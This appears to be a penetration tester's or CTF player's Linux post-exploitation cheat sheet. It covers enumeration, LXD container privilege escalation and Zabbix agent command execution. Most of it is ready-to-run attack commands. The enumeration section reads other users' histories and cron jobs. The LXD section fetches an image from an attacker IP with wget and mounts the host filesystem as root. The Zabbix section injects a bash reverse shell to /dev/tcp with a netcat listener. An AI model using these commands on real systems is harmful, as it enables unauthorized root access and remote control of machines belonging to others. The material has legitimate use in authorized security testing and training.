
### LINUX Checklist: 
```bash

# Any history in ~/.bash_history?
for user in $(ls /home); do cat /home/$user/.bash-history; done

# Any Docker instances running?
docker images

# Any useful network services?
netstat -l

# Any useful processes?
ps -aux

# Any interesting activities going on?
pspy64


# Check www to see if there are any creds or passwords?
/var/www/*

# Any mail?
/var/mail

# Anything in temp? ww
/tmp

# Any cron jobs? 
for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; echo "^"; done

# Run our usual enum tools:
LinEnum
linPEAS
suid3num.py
```

### Lxd Privilege Escalation exploit
```bash
# Check that user is part of lxd group / permissions for lxd
# Ensure /snap/bin is in $PATH
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

wget 10.10.14.15:31337/alpine-<OMITTED>.tar.gz
lxd init # all can be default except using dir instead  of zfs
lxc image import ./alpine-v3.12-x86_64-20200620_2205.tar.gz --alias hacked
lxc image list # view images

lxc init hacked ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
#  the directory of the host system has been mounted to /mnt/root
```
* https://www.hackingarticles.in/lxd-privilege-escalation/

### Zabbix system command execution
```bash
# By default Zabbix agent tasks time out after 3 seconds so a reverse shell will die
echo system.run[ <COMMAND> ] | nc <REMOTE> <PORT>

## To work around the 3 second timeout, the command should be piped to a waiting listener so the reverse shell will spawn another shell immediately upon arrival

# KALI
printf "bash <LISTENER SCRIPT>.sh\n" | nc -nlvvp <PORT> 

# TARGET 
echo system.run[ bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 ] | nc <REMOTE> <PORT>

```